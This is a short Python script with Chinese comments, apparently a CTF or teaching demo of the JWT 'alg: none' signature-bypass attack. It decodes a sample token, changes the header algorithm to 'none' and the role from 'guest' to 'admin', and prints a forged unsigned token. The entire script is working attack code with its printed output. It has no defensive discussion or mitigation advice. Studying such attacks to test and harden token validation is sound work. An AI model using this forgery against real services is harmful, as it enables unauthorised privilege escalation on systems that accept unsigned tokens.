import json
import base64

def jwt_decode(token):
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    # 补全base64 padding并进行base64解码
    def _b64decode(s):
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)
    # 用loads加载json数据
    header = json.loads(_b64decode(parts[0]))
    payload = json.loads(_b64decode(parts[1]))
    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
    return header, payload, signature

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Gj5LcMKKCyWHpGmZHhUAzchUQp_9Lwp7LkM2O5g1Cso'
(h, p, s) = jwt_decode(token)
print("Header:", h)
# Header: {'typ': 'JWT', 'alg': 'HS256'}
print("Payload:", p)
# Payload: {'username': 'admin', 'password': '123', 'role': 'guest'}
# JWT无签名攻击 修改Header和Payload
h['alg'] = 'none'
print("Modified Header:", h)
# Modified Header: {'typ': 'JWT', 'alg': 'none'}
p['role'] = 'admin'
print("Modified Payload:", p)
# Modified Payload: {'username': 'admin', 'password': '123', 'role': 'admin'}
# 构造Base64URL
def jwt_encode(data):
    # 先转成 JSON 字符串（无空格）
    json_str = json.dumps(data, separators=(',', ':'))
    # 标准 Base64 编码
    b64 = base64.b64encode(json_str.encode()).decode()
    # 转为 Base64Url：替换字符 + 移除填充
    return b64.replace('+', '-').replace('/', '_').rstrip('=')

def jwt_encode_nosign(header:json, payload:json):
    h = jwt_encode(header)
    p = jwt_encode(payload)
    nosign_jwt = f"{h}.{p}."
    return nosign_jwt

none_jwt = jwt_encode_nosign(h, p)
print("None JWT:", none_jwt)
# None JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.